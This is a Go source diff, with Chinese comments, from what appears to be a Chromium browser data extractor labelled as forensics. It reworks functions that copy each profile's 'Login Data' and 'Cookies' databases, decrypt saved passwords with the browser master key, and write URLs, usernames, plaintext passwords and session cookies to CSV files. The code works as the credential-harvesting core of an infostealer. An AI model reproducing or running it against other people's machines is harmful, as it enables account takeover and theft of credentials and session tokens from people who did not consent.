@@ -82,45 +82,46 @@ func GetOperaPath(relativePath string) string {
 	}
 	return filepath.Join(appData, relativePath)
 }
-func readSQLiteDB(dbPath string, query string) (string, error) {
+func readSQLiteDB(dbPath string, query string, CSVData [][]string) ([][]string, error) {
 	// 创建一个 strings.Builder 对象，用于构建最终的字符串结果
-	var builder strings.Builder
+	//var builder strings.Builder
 
 	// 创建一个临时文件
 	tempFile, err := os.CreateTemp("", "chrome-passwords-*.db")
 	if err != nil {
-		return "", err
+		return nil, err
 	}
 	defer os.Remove(tempFile.Name()) // 确保临时文件在函数结束时被删除
 
 	// 将数据库文件复制到临时文件
 	if err := utils.CopyFile(dbPath, tempFile.Name()); err != nil {
-		return "", err
+		return nil, err
 	}
 
 	// 打开 SQLite 数据库
 	db, err := sql.Open("sqlite3", tempFile.Name())
 	if err != nil {
-		return "", err
+		return nil, err
 	}
 	defer db.Close()
 
 	// 执行 SQL 查询
 	rows, err := db.Query(query)
 	if err != nil {
-		return "", err
+		return nil, err
 	}
 	defer rows.Close()
 
 	// 获取查询结果的列数
 	columns, err := rows.Columns()
 	if err != nil {
-		return "", err
+		return nil, err
 	}
 
 	// 预分配切片以存储每一行的数据
 	values := make([]interface{}, len(columns))
 	valuePtrs := make([]interface{}, len(columns))
+	//var CSVData [][]string
 
 	// 遍历查询结果
 	for rows.Next() {
@@ -129,10 +130,11 @@ func readSQLiteDB(dbPath string, query string) (string, error) {
 		}
 
 		if err := rows.Scan(valuePtrs...); err != nil {
-			return "", err
+			return nil, err
 		}
 
 		// 将结果添加到 strings.Builder 中
+		var URL, USERNAME, PASSWORD string
 		for i, value := range values {
 			var fieldValue string
 			switch v := value.(type) {
@@ -147,7 +149,7 @@ func readSQLiteDB(dbPath string, query string) (string, error) {
 			if columns[i] == "password_value" {
 				//masterKey, err := utils.GetMasterKey(BrowserPath)
 				if err != nil {
-					return "", fmt.Errorf("failed to get master key: %w", err)
+					return nil, fmt.Errorf("failed to get master key: %w", err)
 				}
 				//decryptedValue, err := decryptPassword([]byte(fieldValue), masterKey)
 				decryptedValue, err := utils.DecryptAESGCM([]byte(fieldValue), MasterKey)
@@ -160,77 +162,85 @@ func readSQLiteDB(dbPath string, query string) (string, error) {
 			// 添加标签和值
 			switch columns[i] {
 			case "signon_realm":
-				builder.WriteString("[URL] -> {" + fieldValue + "}\n")
+				URL = fieldValue
+				//builder.WriteString("[URL] -> {" + fieldValue + "}\n")
 			case "username_value":
-				builder.WriteString("[USERNAME] -> {" + fieldValue + "}\n")
+				USERNAME = fieldValue
+				//builder.WriteString("[USERNAME] -> {" + fieldValue + "}\n")
 			case "password_value":
-				builder.WriteString("[PASSWORD] -> {" + fieldValue + "}\n")
+				PASSWORD = fieldValue
+				//builder.WriteString("[PASSWORD] -> {" + fieldValue + "}\n")
 			}
 		}
-		builder.WriteString("\n")
+		CSVData = append(CSVData, []string{URL, USERNAME, PASSWORD})
+		//builder.WriteString("\n")
 	}
 
 	// 返回构建的字符串结果
-	return builder.String(), nil
+	return CSVData, nil
+	//return builder.String(), nil
 }
 
-func ChromePasswords(targetDir string) (string, error) {
-	var builder strings.Builder
+func ChromePasswords(targetDir string) ([][]string, error) {
+	//var builder strings.Builder
+	var CSVData [][]string
 	// 获取所有浏览器配置文件的数组
 	array := profiles //
 
 	if MasterKey == nil {
-		return "", nil
+		return nil, nil
 	}
+	CSVData = append(CSVData, []string{"URL", "USERNAME", "PASSWORD"})
+
 	// 遍历每个配置文件
 	for _, profile := range array {
 		LoginDataPath := filepath.Join(BrowserPath, profile, "Login Data")
 		// 判断文件是否存在
 		if _, err := os.Stat(LoginDataPath); os.IsNotExist(err) {
-			return "", nil
+			return nil, nil
 		}
 		utils.CopyFile(LoginDataPath, targetDir+"\\Login Data")
-		result, _ := readSQLiteDB(LoginDataPath, "SELECT signon_realm, username_value, password_value FROM logins")
-		builder.WriteString(result)
+		CSVData, _ = readSQLiteDB(LoginDataPath, "SELECT signon_realm, username_value, password_value FROM logins", CSVData)
+
 	}
-	return builder.String(), nil
+	return CSVData, nil
 }
 
-func readSQLiteDB2(dbPath string, query string) (string, interface{}) {
+func readSQLiteDB2(dbPath string, query string, CSVData [][]string) ([][]string, interface{}) {
 
 	// 创建一个 strings.Builder 对象，用于构建最终的字符串结果
-	var builder strings.Builder
+	//var builder strings.Builder
 
 	// 创建一个临时文件
 	tempFile, err := os.CreateTemp("", "chrome-cookies-*.db")
 	if err != nil {
-		return "", err
+		return nil, err
 	}
 	defer os.Remove(tempFile.Name()) // 确保临时文件在函数结束时被删除
 
 	// 将数据库文件复制到临时文件
 	if err := utils.CopyFile(dbPath, tempFile.Name()); err != nil {
-		return "", err
+		return nil, err
 	}
 
 	// 打开 SQLite 数据库
 	db, err := sql.Open("sqlite3", tempFile.Name())
 	if err != nil {
-		return "", err
+		return nil, err
 	}
 	defer db.Close()
 
 	// 执行 SQL 查询
 	rows, err := db.Query(query)
 	if err != nil {
-		return "", err
+		return nil, err
 	}
 	defer rows.Close()
 
 	// 获取查询结果的列数
 	columns, err := rows.Columns()
 	if err != nil {
-		return "", err
+		return nil, err
 	}
 
 	// 预分配切片以存储每一行的数据
@@ -244,7 +254,7 @@ func readSQLiteDB2(dbPath string, query string) (string, interface{}) {
 		}
 
 		if err := rows.Scan(valuePtrs...); err != nil {
-			return "", err
+			return nil, err
 		}
 		var domain string
 		var name string
@@ -273,7 +283,7 @@ func readSQLiteDB2(dbPath string, query string) (string, interface{}) {
 			if columns[i] == "expires_utc" {
 				result, err := strconv.ParseInt(fieldValue, 10, 64)
 				if err != nil {
-					return "", fmt.Errorf("failed to parse expires_utc: %w", err)
+					return nil, fmt.Errorf("failed to parse expires_utc: %w", err)
 				}
 				// 计算 num
 				if float64(result)/1000000.0-11644473600.0 > 0.0 {
@@ -295,33 +305,36 @@ func readSQLiteDB2(dbPath string, query string) (string, interface{}) {
 
 		}
 		// 构建 JSON 字符串
-		jsonStr := fmt.Sprintf(`{
-			"domain": "%s",
-			"expirationDate": %d,
-			"hostOnly": false,
-			"name": "%s",
-			"path": "%s",
-			"session": true,
-			"storeId": null,
-			"value": "%s"
-		}`, domain, num, name, path, encryptedValue)
-		builder.WriteString(jsonStr)
+		//jsonStr := fmt.Sprintf(`{
+		//	"domain": "%s",
+		//	"expirationDate": %d,
+		//	"hostOnly": false,
+		//	"name": "%s",
+		//	"path": "%s",
+		//	"session": true,
+		//	"storeId": null,
+		//	"value": "%s"
+		//}`, domain, num, name, path, encryptedValue)
+		//builder.WriteString(jsonStr)
+		CSVData = append(CSVData, []string{domain, fmt.Sprintf("%d", num), "false", name, path, "true", "null", encryptedValue})
 
-		builder.WriteString("\n")
+		//builder.WriteString("\n")
 	}
 
 	// 返回构建的字符串结果
-	return builder.String(), nil
+	return CSVData, nil
 }
 
-// todo 如果谷歌浏览器运行中，cookie文件将会被使用中，数据库文件结构会改变，导致无法读取到内容,目前没有解决方案，待后续研究
-func ChromeCookies(targetDir string) (string, error) {
-	var builder strings.Builder
+// todo 如果谷歌浏览器运行中，cookie文件将会被使用中，数据库文件结构会改变!，导致无法读取到内容,目前没有解决方案，待后续研究
+func ChromeCookies(targetDir string) ([][]string, error) {
+
 	// 获取所有浏览器配置文件的数组
 	array := profiles //
+	var CSVData [][]string
+	CSVData = append(CSVData, []string{"domain", "expirationDate", "hostOnly", "name", "path", "session", "storeId", "value"})
 
 	if MasterKey == nil {
-		return "", nil
+		return nil, nil
 	}
 	// 遍历每个配置文件
 	for _, profile := range array {
@@ -332,13 +345,13 @@ func ChromeCookies(targetDir string) (string, error) {
 		}
 
 		if _, err := os.Stat(CookiesPath1); os.IsNotExist(err) {
-			return "", fmt.Errorf("both paths do not exist: %s and %s", CookiesPath1, CookiesPath2)
+			return nil, fmt.Errorf("both paths do not exist: %s and %s", CookiesPath1, CookiesPath2)
 		}
 		utils.CopyFile(CookiesPath1, targetDir+"\\Cookies")
-		result, _ := readSQLiteDB2(CookiesPath1, "SELECT host_key, name, encrypted_value,path,expires_utc FROM cookies")
-		builder.WriteString(result)
+		CSVData, _ = readSQLiteDB2(CookiesPath1, "SELECT host_key, name, encrypted_value,path,expires_utc FROM cookies", CSVData)
+		//builder.WriteString(result)
 	}
-	return builder.String(), nil
+	return CSVData, nil
 }
 func ChromeBooks(targetDir string) (string, error) {
 	// 实现获取 bookmarks 的逻辑
@@ -474,7 +487,7 @@ func ChromeHistory(targetDir string) string {
 	return builder.String()
 }
 func ChromeSave(path string) {
-
+	// 遍历浏览器列表
 	for browserName, browserPath := range browserOnChromium {
 		// 初始化默认配置文件列表
 		profiles = []string{"Default"}
@@ -525,9 +538,9 @@ func ChromeSave(path string) {
 		}
 		// 取证密码
 		passwords, err := ChromePasswords(targetDir)
-		if passwords != "" {
-			outputFile := BrowserName + "_passwords.txt"
-			if err := utils.WriteToFile(passwords, targetDir+"\\"+outputFile); err != nil {
+		if len(passwords) > 1 {
+			outputFile := BrowserName + "_passwords.csv"
+			if err := utils.WriteDataToCSV(targetDir+"\\"+outputFile, passwords); err != nil {
 				fmt.Println("Error writing to file:", err)
 				return
 			}
@@ -541,10 +554,11 @@ func ChromeSave(path string) {
 				return
 			}
 		}
+		// 取证cookie
 		cookies, err := ChromeCookies(targetDir)
-		if cookies != "" {
-			outputFile := BrowserName + "_cookies.txt"
-			if err := utils.WriteToFile(cookies, targetDir+"\\"+outputFile); err != nil {
+		if len(cookies) > 1 {
+			outputFile := BrowserName + "_cookies.csv"
+			if err := utils.WriteDataToCSV(targetDir+"\\"+outputFile, cookies); err != nil {
 				fmt.Println("Error writing to file:", err)
 				return
 			}
